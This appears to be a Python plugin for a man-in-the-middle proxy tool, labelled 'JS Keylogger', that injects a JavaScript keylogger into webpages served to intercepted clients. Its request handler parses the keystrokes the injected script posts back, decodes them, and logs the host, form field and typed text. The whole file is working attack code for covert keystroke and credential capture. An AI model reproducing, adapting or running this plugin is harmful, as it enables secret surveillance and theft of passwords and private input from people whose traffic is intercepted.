from plugins.plugin import Plugin
from plugins.inject import Inject

class JSKeylogger(Plugin):
    name = 'JS Keylogger'
    optname = 'jskeylogger'
    desc = 'Injects a javascript keylogger into clients webpages'
    version = '1.0'

    def initialize(self, context):
        context.js_file = open('plugins/resources/msfkeylogger.js', 'r')

    def request(self, context, flow):
        if flow.request.method == 'POST' and ('keylog' in flow.request.path):

            #Overrides the default POST output
            context.handle_post_output = True

            raw_keys = flow.request.content.split("&&")[0]
            input_field = flow.request.content.split("&&")[1]

            keys = raw_keys.split(",")
            if keys:
                del keys[0]; del(keys[len(keys)-1])

                nice = ''
                for n in keys:
                    if n == '9':
                        nice += "<TAB>"
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += n.decode('hex')
                        except:
                            context.log("[JSKeylogger] Error decoding char: {}".format(n))

                context.log("[JSKeylogger] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))

    def response(self, context, flow):
        Inject().response(context, flow)